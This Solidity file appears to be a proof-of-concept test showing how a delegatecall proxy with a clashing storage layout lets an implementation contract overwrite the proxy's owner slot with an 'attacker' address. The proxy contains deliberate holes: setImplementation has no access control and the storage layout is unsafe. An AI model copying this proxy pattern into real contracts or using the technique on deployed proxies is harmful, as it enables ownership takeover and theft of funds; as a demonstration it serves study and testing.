// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

contract CollisionProxy {
    address public owner;
    mapping(address => uint256) public balances;
    address public implementation;

    function setImplementation(address target) external {
        implementation = target;
    }

    fallback() external payable {
        (bool success, ) = implementation.delegatecall(msg.data);
        require(success, "delegatecall failed");
    }
}

contract CollisionImplementation {
    address public owner;

    function overwriteOwner(address nextOwner) external {
        owner = nextOwner;
    }
}

contract StorageCollisionPoC {
    function testPoC_DelegatecallOverwritesProxySlot() external {
        CollisionProxy proxy = new CollisionProxy();
        CollisionImplementation implementation = new CollisionImplementation();
        proxy.setImplementation(address(implementation));
        address attacker = address(0xBEEF);
        (bool success, ) = address(proxy).call(
            abi.encodeWithSignature("overwriteOwner(address)", attacker)
        );
        require(success, "delegatecall write failed");
        require(proxy.owner() == attacker, "proxy owner slot was not overwritten");
    }
}
